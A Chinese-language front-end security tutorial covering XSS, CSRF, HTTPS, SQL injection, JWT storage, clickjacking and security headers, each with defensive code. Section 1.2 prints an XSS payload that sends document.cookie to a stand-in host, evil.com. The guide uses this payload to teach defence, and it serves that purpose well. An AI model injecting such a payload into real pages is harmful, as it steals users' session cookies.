## 前言

前端安全不是后端专属的责任。**XSS 攻击、CSRF 伪造请求、敏感信息泄露**——这些安全威胁如果不了解，你的项目随时可能被攻击。

本文聚焦前端能做的安全防护，不讲空泛的概念，直接给可落地的方案。

---

## 一、XSS（跨站脚本攻击）

### 1.1 什么是 XSS

攻击者在网页中注入恶意脚本，当用户访问时执行该脚本，从而窃取 cookie、token 等信息。

**三种类型：**

| 类型 | 原理 | 危害 |
|------|------|------|
| **存储型** | 恶意代码存到服务器（如评论区） | 最大（持久化）|
| **反射型** | 恶意代码在 URL 参数中 | 中（需诱导点击）|
| **DOM 型** | 通过前端 JS 动态注入 | 中 |

### 1.2 XSS 示例

```html
<!-- 攻击者在评论框输入： -->
<script>document.cookie</script>
<img src="x" onerror="fetch('https://evil.com/steal?cookie=' + document.cookie)" />
```

### 1.3 防御方案

#### 方案 1：转义输出（最核心）

```javascript
// 手动转义 HTML 特殊字符
function escapeHtml(str) {
  const div = document.createElement('div')
  div.appendChild(document.createTextNode(str))
  return div.innerHTML
}

// 现代框架自动处理：
// Vue: {{ data }} 默认转义
// React: {data} 默认转义
// 除非使用 v-html / dangerouslySetInnerHTML
```

#### 方案 2：设置 Content-Security-Policy

```html
<!-- 只允许同源脚本执行 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

```nginx
# Nginx 配置 CSP
add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.example.com; style-src 'self' 'unsafe-inline'";
```

#### 方案 3：HttpOnly Cookie

```javascript
// 设置 cookie 时加 HttpOnly 标记
// 这样 JS 无法通过 document.cookie 读取
Set-Cookie: sessionid=xxx; HttpOnly; Secure; SameSite=Strict
```

## 二、CSRF（跨站请求伪造）

### 2.1 什么是 CSRF

用户登录了银行网站 A，然后访问了恶意网站 B。B 网站构造了一个请求（转账），因为浏览器自动携带了 A 网站的 cookie，请求看起来是"合法"的。

```
用户登录 bank.com → 获得 cookie
用户访问 evil.com → evil.com 构造请求 POST bank.com/transfer
浏览器自动带上 cookie → 银行以为是用户本人操作
```

### 2.2 防御方案

#### 方案 1：SameSite Cookie（最推荐）

```javascript
// 设置 cookie 时指定 SameSite 属性
Set-Cookie: sessionid=xxx; SameSite=Strict; Secure

// SameSite 取值：
// Strict: 完全禁止跨站携带（最安全）
// Lax: GET 请求可以携带（默认值，兼顾体验）
// None: 不做限制（必须配合 Secure）
```

#### 方案 2：CSRF Token

```html
<!-- 后端生成随机 token，嵌入到表单中 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="随机token" />
  <input type="text" name="amount" />
  <button>转账</button>
</form>
```

#### 方案 3：验证 Referer/Origin

```nginx
# Nginx 检查请求来源
if ($http_origin !~ '^https?://(yourdomain.com)') {
  return 403;
}
```

## 三、HTTPS

### 3.1 为什么需要 HTTPS

```
HTTP: 明文传输 → 中间人可以窃听、篡改
HTTPS: TLS 加密 → 防窃听、防篡改、防冒充
```

### 3.2 前端注意事项

```html
<!-- 混合内容问题：HTTPS 页面不要加载 HTTP 资源 -->
<script src="http://cdn.example.com/script.js"></script>
<!-- ❌ 浏览器会阻止（或提示不安全） -->

<!-- 使用相对协议或 HTTPS -->
<script src="//cdn.example.com/script.js"></script>
<script src="https://cdn.example.com/script.js"></script>
```

## 四、其他安全实践

### 4.1 防 SQL 注入

```javascript
// ❌ 直接拼接 SQL
const query = `SELECT * FROM users WHERE id = ${userId}`

// ✅ 使用参数化查询（ORM 或 prepared statements）
const query = 'SELECT * FROM users WHERE id = ?'
db.execute(query, [userId])
```

### 4.2 JWT 安全存储

```javascript
// ❌ 将 token 存在 localStorage
localStorage.setItem('token', jwtToken)
// XSS 攻击可读取: localStorage.getItem('token')

// ✅ 存在 httpOnly cookie 中（后端设置）
// ✅ 或存在内存变量中（刷新页面丢失）
// ✅ 使用刷新 token 机制
```

### 4.3 点击劫持防御

```html
<!-- 禁止页面被嵌入到 iframe 中 -->
<meta http-equiv="X-Frame-Options" content="DENY">

<!-- Nginx 配置 -->
add_header X-Frame-Options "SAMEORIGIN" always;
```

### 4.4 输入校验

```javascript
// 前端校验 + 后端校验（前端校验只是用户体验）
function validateEmail(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}

// DOMPurify 清理用户输入的 HTML
import DOMPurify from 'dompurify'
const cleanHtml = DOMPurify.sanitize(userInput)
```

## 五、安全头速查

| 头部 | 作用 | 推荐值 |
|------|------|--------|
| `Content-Security-Policy` | 限制资源来源 | `default-src 'self'` |
| `X-Content-Type-Options` | 禁止 MIME 嗅探 | `nosniff` |
| `X-Frame-Options` | 防止点击劫持 | `DENY` 或 `SAMEORIGIN` |
| `Strict-Transport-Security` | 强制 HTTPS | `max-age=31536000` |
| `Referrer-Policy` | 控制 referer 信息 | `strict-origin-when-cross-origin` |

```nginx
# Nginx 安全头配置
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "SAMEORIGIN" always;
add_header X-XSS-Protection "1; mode=block" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

## 总结

```javascript
// 前端安全核心要点：
//
// 🛡️ XSS 防护
//   - 转义用户输入（框架默认做）
//   - CSP 策略限制脚本来源
//   - HttpOnly Cookie 保护 session
//
// 🛡️ CSRF 防护
//   - SameSite Cookie（最佳方案）
//   - CSRF Token
//
// 🛡️ 通用实践
//   - 使用 HTTPS
//   - 敏感信息不存 localStorage
//   - 输入校验（但信任后端校验）
//   - 安全头配置

// 最重要的原则：永远不要信任用户的输入
```
